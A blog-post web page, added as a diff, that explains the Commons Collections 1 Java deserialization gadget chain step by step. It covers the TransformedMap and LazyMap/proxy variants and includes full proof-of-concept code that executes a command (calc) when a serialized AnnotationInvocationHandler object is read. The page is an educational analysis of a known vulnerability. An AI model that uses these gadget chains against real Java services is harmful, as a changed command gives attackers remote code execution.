@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Commons-Collections1 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="Apache Commons Collections 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。作为 Apache 开源项目的重要组件，被广泛运用于..." />
+    <meta name="keywords" content="cc,java" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Commons-Collections1</h2>
+            <div class="post-date">2022-11-12</div>
+            
+              <div class="feature-container" style="background-image: url('https://dydydy123.github.io/post-images/commons-collections1.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <p><code>Apache Commons Collections</code> 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。作为 Apache 开源项目的重要组件，被广泛运用于各种 Java 应用的开发。<br>
+在Commons Collections中实现了一个<code>TransformedMap</code>类，该类是对 Java 标准数据结构类型Map接口的一个扩展。该类可以在一个Map元素加入到集合内时，自动对该元素进行特定的修饰变化，而具体的变换逻辑则由<code>Transformer</code>类定义，<code>Transformer</code>在<code>TransformedMap</code>实例化时作为参数传入</p>
+<!-- more -->
+<h1 id="transformedmap链前置知识">TransformedMap链前置知识</h1>
+<h1 id="利用条件">利用条件</h1>
+<p><strong>利用版本：CommonsCollections 3.1 - 3.2.1 限制：jdk 8u71 版本之前</strong></p>
+<h1 id="接口类与实现类">接口类与实现类</h1>
+<h1 id="transformer">Transformer</h1>
+<p><code>Transformer#transform</code><br>
+Transformer接口定义了一个对象修饰变化的方法transform。</p>
+<pre><code>public interface Transformer {
+    public Object transform(Object input);
+}
+</code></pre>
+<p><strong>一些重要类</strong><br>
+该接口的重要实现类：<code>ConstantTransformer</code>，<code>invokerTransformer</code>，<code>ChainedTransformer</code>，以及调用了<code>invokerTransformer</code>实现类的<code>TransformedMap</code></p>
+<h1 id="constanttransformer">ConstantTransformer</h1>
+<p>当调用transform方法时对传入的对象不会做任何处理，直接返回构造函数中传入的对象。它的作用便是包装任意一个对象，在执行<code>transform</code>回调时返回这个对象<br>
+<code>ConstantTransformer#ConstantTransformer</code>与<code>ConstantTransformer#transform</code></p>
+<pre><code>    public ConstantTransformer(Object constantToReturn) {
+        super();
+        iConstant = constantToReturn;
+    }
+    public Object transform(Object input) {
+        return iConstant;
+    }
+</code></pre>
+<h1 id="invokertransformer">InvokerTransformer</h1>
+<p><code>InvokerTransformer</code>是<strong>执行类</strong>，在该类的transform方法中实现了类方法的动态调用（及存在任意方法执行）<br>
+<code>InvokerTransformer#InvokerTransformer</code></p>
+<pre><code>public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
+        super();
+        iMethodName = methodName;
+        iParamTypes = paramTypes;
+        iArgs = args;
+    }
+</code></pre>
+<p><code>InvokerTransformer#transform</code></p>
+<pre><code>public Object transform(Object input) {
+        if (input == null) {
+            return null;
+        }
+        try {
+            Class cls = input.getClass();
+            Method method = cls.getMethod(iMethodName, iParamTypes);
+            return method.invoke(input, iArgs);
+                
+        } catch (NoSuchMethodException ex) {
+            throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' does not exist&quot;);
+        } catch (IllegalAccessException ex) {
+            throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' cannot be accessed&quot;);
+        } catch (InvocationTargetException ex) {
+            throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' threw an exception&quot;, ex);
+        }
+    }
+</code></pre>
+<p>在<code>InvokerTransformer#transform</code>中存在任意方法执行,其中<code>iMethodName</code>,<code>iParamTypes</code>,<code>iArgs</code>均可控。</p>
+<pre><code>Class cls = input.getClass();
+Method method = cls.getMethod(iMethodName, iParamTypes);
+return method.invoke(input, iArgs);
+</code></pre>
+<p><strong>正常反射执行</strong></p>
+<pre><code>public class Cc1 {
+    public static void main(String[] arges) throws Exception {
+        Class&lt;?&gt; runtime = Class.forName(&quot;java.lang.Runtime&quot;);
+        Method getRuntime = runtime.getMethod(&quot;getRuntime&quot;);
+        Method exec = runtime.getMethod(&quot;exec&quot;, String.class);
+        Object input = getRuntime.invoke(runtime);
+        exec.invoke(input,&quot;calc&quot;);
+    }
+}
+</code></pre>
+<p><strong>使用<code>InvokerTransformer#transform</code>进行方法执行</strong></p>
+<pre><code>public class Cc1 {
+    public static void main(String[] arges) throws Exception {
+//        参数1：是待执行的方法名，参数2：是待执行方法的参数类型，参数3：待执行方法的参数列表
+        Method Method = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}).transform(Runtime.class);
+        Object obj = new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(Method);
+        new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}).transform(obj);
+
+    }
+}
+</code></pre>
+<h1 id="chainedtransformer">ChainedTransformer</h1>
+<p><code>ChainedTransformer#ChainedTransformer</code></p>
+<pre><code>public ChainedTransformer(Transformer[] transformers) {
+        super();
+        iTransformers = transformers;
+    }
+</code></pre>
+<p><code>ChainedTransformer#transform</code></p>
+<pre><code>    public Object transform(Object object) {
+        for (int i = 0; i &lt; iTransformers.length; i++) {
+            object = iTransformers[i].transform(object);
+        }
+        return object;
+    }
+</code></pre>
+<p><code>ChainedTransformer#transform</code>方法是对<code>Transformer</code>实现类们的链式调用，当传入一个<code>Transformer数组</code>时，<code>ChainedTransformer</code>就会依次调用每一个<code>Transformer</code>的<code>transform</code>回调方法，并将前一个回调返回的结果，作为后一个回调的参数传入。<br>
+<code>Transformer数组</code>中第一个<code>Transformer</code>的<code>transform</code>方法传入为外部<code>ChainedTransformer(transformers).transform(Runtime.class)</code>处<code>transform</code>方法的传入。<br>
+不难看出之前使用<code>InvokerTransformer#transform</code>进行方法执行的代码中便是将上一行返回的对象变成下一行<code>transform</code>方法的传入。<br>
+<img src="https://dydydy123.github.io/post-images/1668325596491.png" alt="" loading="lazy"><br>
+<strong>示例：用ChainedTransformer#transform重写前面的任意方法执行代码</strong></p>
+<pre><code>public class Cc1 {
+    public static void main(String[] arges) throws Exception {
+//        参数1：是待执行的方法名，参数2：是待执行方法的参数类型，参数3：待执行方法的参数列表
+        Transformer[] transformers = {
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}),
+        };
+        new ChainedTransformer(transformers).transform(Runtime.class);
+    }
+}
+</code></pre>
+<h1 id="transformedmap">TransformedMap</h1>
+<p>这里引入<code>TransformedMap</code>类，<code>org.apache.commons.collections.map.TransformedMap</code>类间接的实现了java.util.Map接口，同时支持对Map的key或者value进行<code>Transformer</code>转换。</p>
+<pre><code>protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
+        super(map);
+        this.keyTransformer = keyTransformer;
+        this.valueTransformer = valueTransformer;
+    }
+</code></pre>
+<p>该构造函数为protected，因此应该存在内部调用。通过调用<code>decorate()</code>和<code>decorateTransform()</code>方法都可以调用<code>TransformedMap()</code>的构造函数<code>TransformedMap#TransformedMap</code></p>
+<p><code>TransformedMap#decorate</code><br>
+可构造<code>TransformedMap</code>类</p>
+<pre><code>public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
+        return new TransformedMap(map, keyTransformer, valueTransformer);
+    }
+</code></pre>
+<p>可以发现在<code>TransformedMap</code>类中通过<code>checkSetValue()</code>、<code>put()</code>和<code>putAll()</code>方法都可以调用构造时传进来的<code>Transform</code>类（例如<code>InvokerTransformer</code>，<code>ChainedTransformer</code>）的<code>transform()</code>方法。但是<code>put()</code>与<code>putAll()</code>是分别通过<code>transformKey()</code>与<code>transformValue()</code>间接调用</p>
+<pre><code>    protected Object checkSetValue(Object value) {
+        return valueTransformer.transform(value);
+    }
+
+    public Object put(Object key, Object value) {
+        key = transformKey(key);
+        value = transformValue(value);
+        return getMap().put(key, value);
+    }
+
+    public void putAll(Map mapToCopy) {
+        mapToCopy = transformMap(mapToCopy);
+        getMap().putAll(mapToCopy);
+    }
+
+
+    protected Object transformKey(Object object) {
+        if (keyTransformer == null) {
+            return object;
+        }
+        return keyTransformer.transform(object);
+    }
+    protected Object transformValue(Object object) {
+        if (valueTransformer == null) {
+            return object;
+        }
+        return valueTransformer.transform(object);
+    }
+</code></pre>
+<h1 id="transformedmap链">TransformedMap链</h1>
+<p><strong>执行类</strong><br>
+<code>InvokerTransformer#transformer</code>中存在任意方法执行，因此可以该类为执行类。<br>
+<strong>调用链</strong><br>
+<img src="https://dydydy123.github.io/post-images/1668332182306.png" alt="" loading="lazy"></p>
+<p><strong>入口类</strong><br>
+<code>AnnotationInvocationHandler.readObject()</code></p>
+<p><strong>InvokerTransformer#transformer</strong><br>
+在<code>InvokerTransformer#transformer</code>中可任意方法执行，我们向上查找谁调用了该方法<br>
+<img src="https://dydydy123.github.io/post-images/1668334128822.png" alt="" loading="lazy"><br>
+在<code>TransformedMap</code>中存在多次调用进行更进。</p>
+<p><strong>TransformedMap#checkSetValue</strong></p>
+<pre><code>protected Object checkSetValue(Object value) {
+        return valueTransformer.transform(value);
+    }
+</code></pre>
+<p>继续向上查找谁调用了<code>checkSetValue()</code>,发现只存在一处调用。</p>
+<p><strong>AbstractInputCheckedMapDecorator#setValue</strong><br>
+在<code>AbstractInputCheckedMapDecorator</code>类的<code>MapEntry()</code>方法调用了<code>checkSetValue()</code></p>
+<pre><code>static class MapEntry extends AbstractMapEntryDecorator {
+
+        /** The parent map */
+        private final AbstractInputCheckedMapDecorator parent;
+
+        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
+            super(entry);
+            this.parent = parent;
+        }
+
+        public Object setValue(Object value) {
+            value = parent.checkSetValue(value);
+            return entry.setValue(value);
+        }
+    }
+</code></pre>
+<p>在此处的调用链编写：</p>
+<pre><code>public class Cc1 {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = {
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}),
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        Map map = new HashMap();
+        //使用MapEntry的setValue方法执行时需给map赋值
+        map.put(&quot;1&quot;,&quot;2&quot;);
+        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map, null, chainedTransformer);
+        //使用TransformedMap的put方法执行
+        //decorateMap.put(&quot;1&quot;,Runtime.class);
+        //使用MapEntry的setValue方法执行
+        for(Map.Entry entry: decorateMap.entrySet()){
+            entry.setValue(Runtime.class);
+        }
+    }
+}
+</code></pre>
+<p>接下来就是查找何处调用了<code>setValue()</code>，最好是某处的<code>readObject()</code><br>
+<img src="https://dydydy123.github.io/post-images/1668339017818.png" alt="" loading="lazy"></p>
+<p><strong>AnnotationInvocationHandler</strong><br>
+在<code>AnnotationInvocationHandler</code>类中找到了重构后的readObject()方法，并存在调用<code>setValue()</code>的地方。</p>
+<p><strong>AnnotationInvocationHandler#AnnotationInvocationHandler</strong></p>
+<pre><code>AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) {
+        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();
+        if (!type.isAnnotation() ||
+            superInterfaces.length != 1 ||
+            superInterfaces[0] != java.lang.annotation.Annotation.class)
+            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);
+        this.type = type;
+        this.memberValues = memberValues;
+    }
+</code></pre>
+<p>该构造函数的第一个参数是Class需要继承Annotation注解，第二个是参数就是前面通过<code>decorate</code>构造的<code>TransformedMap</code>。<br>
+构造POC的时候，需要创建一个<code>AnnotationInvocationHandler</code>对象，而<code>AnnotationInvocationHandler</code>不能直接获取因为该构造函数没有设置访问属性，默认为<code>protected</code>，所以需要通过反射来获取。</p>
+<pre><code>Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(Class.class, Map.class);
+constructor.setAccessible(true);
+Object obj = constructor.newInstance(Target.class, decorateMap);
+</code></pre>
+<p><strong>AnnotationInvocationHandler#readObject</strong></p>
+<pre><code>private void readObject(java.io.ObjectInputStream s)
+        throws java.io.IOException, ClassNotFoundException {
+        s.defaultReadObject();
+
+        // Check to make sure that types have not evolved incompatibly
+
+        AnnotationType annotationType = null;
+        try {
+            annotationType = AnnotationType.getInstance(type);
+        } catch(IllegalArgumentException e) {
+            // Class is no longer an annotation type; time to punch out
+            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
+        }
+
+        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();
+
+        // If there are annotation members without values, that
+        // situation is handled by the invoke method.
+        for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) {
+            String name = memberValue.getKey();
+            Class&lt;?&gt; memberType = memberTypes.get(name);
+            if (memberType != null) {  // i.e. member still exists
+                Object value = memberValue.getValue();
+                if (!(memberType.isInstance(value) ||
+                      value instanceof ExceptionProxy)) {
+                    memberValue.setValue(
+                        new AnnotationTypeMismatchExceptionProxy(
+                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(
+                                annotationType.members().get(name)));
+                }
+            }
+        }
+    }
+</code></pre>
+<p>核心逻辑就是 <code>Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()</code> 和<code>memberValue.setValue(...)</code>.<br>
+<code>memberValues</code>便是执行构造函数时传入的Map，也是经过了<code>TransformedMap#decorate</code>修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用<code>setValue</code>设置值的时候就会触发<code>TransformedMap</code>里的<code>checkSetValue()</code>中的<code>transform()</code>，进而执行我们为其精心设计的任意代码。<br>
+在此之前还需要满足一些条件才能进入调用<code>setValue()</code>的地方。</p>
+<pre><code>//Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();
+//获取我们传入的type的成员变量。type为注解类，及该注解类需要有成员变量。
+if (memberType != null) {  // i.e. member still exists
+//且被 TransformedMap.decorate 修饰的Map中必须有一个键名与注解类中的成员变量的名字相同。
+                Object value = memberValue.getValue();
+                if (!(memberType.isInstance(value) ||
+                      value instanceof ExceptionProxy)) {
+                    memberValue.setValue(
+/**此处new AnnotationTypeMismatchExceptionProxy为不可控参数，并不能控制它为Runtime.class,这时前面的ConstantTransformer就派上用场了，当调用ConstantTransformer#transform方法时对传入的对象(AnnotationTypeMismatchExceptionProxy)不会做任何处理，直接返回构造函数中
+传入(new ConstantTransformer(Runtime.class))的对象。它的作用便是包装任意一个
+对象，在执行`transform`回调时返回这个对象**/
+                        new AnnotationTypeMismatchExceptionProxy(
+                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(
+                                annotationType.members().get(name)));
+                }
+            }
+</code></pre>
+<h1 id="完整poc">完整poc</h1>
+<pre><code>package Cc1;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+
+public class TestCc1 {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}),
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();
+        map.put(&quot;value&quot;,&quot;2&quot;);
+        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map, null, chainedTransformer);
+
+
+//        反射获取AnnotationInvocationHandler
+        Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        Object obj = constructor.newInstance(Target.class, decorateMap);
+//        serialize(obj);
+        unserialize(&quot;ser.bin&quot;);
+
+    }
+
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        o.writeObject(obj);
+    }
+    public static Object unserialize(String s) throws IOException, ClassNotFoundException {
+        ObjectInputStream o = new ObjectInputStream(new FileInputStream(s));
+        return o.readObject();
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://dydydy123.github.io/post-images/1668352706271.png" alt="" loading="lazy"></figure>
+<h1 id="lazymap">LazyMap</h1>
+<p><img src="https://dydydy123.github.io/post-images/1668407703215.png" alt="" loading="lazy"><br>
+<code>org.apache.commons.collections.map.LazyMap</code> 与 <code>TransformedMap</code> 类似，不过不同是调用 get() 方法时会检查key是否在map中，如果不存在则会触发 factory.transform(key)方法。</p>
+<pre><code>public Object get(Object key) {
+        // create value for key if key is not currently in the map
+        if (map.containsKey(key) == false) {
+            Object value = factory.transform(key);
+            map.put(key, value);
+            return value;
+        }
+        return map.get(key);
+    }
+</code></pre>
+<p>factory为构造LazyMap时传入的参数是可控的。</p>
+<pre><code>protected LazyMap(Map map, Transformer factory) {
+        super(map);
+        if (factory == null) {
+            throw new IllegalArgumentException(&quot;Factory must not be null&quot;);
+        }
+        this.factory = factory;
+    }
+</code></pre>
+<p><strong>构造一下当前的利用链：</strong></p>
+<pre><code>package Cc1;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Cc1 {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}),
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();
+
+        Map lazyMap = LazyMap.decorate(map,chainedTransformer);
+        lazyMap.get(null);
+
+    }
+}
+
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://dydydy123.github.io/post-images/1668407576888.png" alt="" loading="lazy"></figure>
+<p>接下来便是查找什么地方调用了get()方法在<code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的<code>readObject()</code>方法中并没有直接调用到<code>LazyMap</code>的get方法。所以ysoserial找到了另一条路，<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法有调用到get方法</p>
+<pre><code>public Object invoke(Object proxy, Method method, Object[] args) {
+        String member = method.getName();
+        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();
+
+        // Handle Object and Annotation methods
+        if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp;
+            paramTypes[0] == Object.class)
+            return equalsImpl(args[0]);
+        if (paramTypes.length != 0)
+            throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);
+
+        switch(member) {
+        case &quot;toString&quot;:
+            return toStringImpl();
+        case &quot;hashCode&quot;:
+            return hashCodeImpl();
+        case &quot;annotationType&quot;:
+            return type;
+        }
+
+        // Handle annotation member accessors
+        Object result = memberValues.get(member);
+
+        if (result == null)
+            throw new IncompleteAnnotationException(type, member);
+
+        if (result instanceof ExceptionProxy)
+            throw ((ExceptionProxy) result).generateException();
+
+        if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0)
+            result = cloneArray(result);
+
+        return result;
+    }
+</code></pre>
+<p><code>Object result = memberValues.get(member);</code>，<code>memberValues</code>为构造<code>AnnotationInvocationHandler</code>对象时传入的参数（及LazyMap）。</p>
+<p>那又如何能调用到<code>AnnotationInvocationHandler#invoke </code>呢？ysoserial的作者是利用了Java的对象代理。</p>
+<p>在使用带有装饰器的 <code>LazyMap</code> 初始化 <code>AnnotationInvocationHandler</code> 之前，先使用 <code>AnnotationInvocationHandler</code> 代理一下 <code>LazyMap</code>，使用代理后得到的<code>LazyMapProxy</code>（代理对象）初始化<code>AnnotationInvocationHandler</code>（我们不能直接对<code>LazyMapProxy</code>代理对象进行序列化，因为我们的入口点是sun.reflect.annotation.AnnotationInvocationHandler#readObject），这样反序列化 <code>AnnotationInvocationHandler</code> 时，只要调用 <code>LazyMapProxy</code> （代理对象）的<br>
+任意方法（此处为<code>entrySet()</code>)）就会调用代理类的 <code>invoke()</code> 方法，从而触发 <code>LazyMap</code> 的 <code>get()</code> 方法。</p>
+<p><strong>完整poc</strong></p>
+<pre><code>package Cc1;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Cc1 {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}),
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();
+
+        Map lazyMap = LazyMap.decorate(map,chainedTransformer);
+//        lazyMap.get(null);
+
+//        通过反射获取AnnotationInvocationHandler
+        Class&lt;?&gt; cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor&lt;?&gt; Constructor = cls.getDeclaredConstructor(Class.class, Map.class);
+        Constructor.setAccessible(true);
+        // 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例
+        InvocationHandler handler = (InvocationHandler)Constructor.newInstance(Target.class, lazyMap);
+        // 创建LazyMap的动态代理类实例
+        Map lazyMapProxy = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), handler);
+        // 使用动态代理初始化 AnnotationInvocationHandler
+        handler = (InvocationHandler)Constructor.newInstance(Target.class, lazyMapProxy);
+//        serialize(handler);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        o.writeObject(obj);
+    }
+    public static Object unserialize(String s) throws IOException, ClassNotFoundException {
+        ObjectInputStream o = new ObjectInputStream(new FileInputStream(s));
+        return o.readObject();
+    }
+}
+
+</code></pre>
+<h1 id="参考链接">参考链接：</h1>
+<p>https://www.le1a.com/post/%E6%B5%85%E8%B0%88Commons-Collections1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</p>
+<p>http://www.bmth666.cn/bmth_blog/2022/02/21/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/#LazyMap-1</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://dydydy123.github.io/tag/H2OnWZra8/" class="tag">
+                    cc
+                  </a>
+                
+                  <a href="https://dydydy123.github.io/tag/-DwzpURo7/" class="tag">
+                    java
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://dydydy123.github.io/post/java-lei-de-dong-tai-jia-zai/">
+                  <h3 class="post-title">
+                    java类的动态加载
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
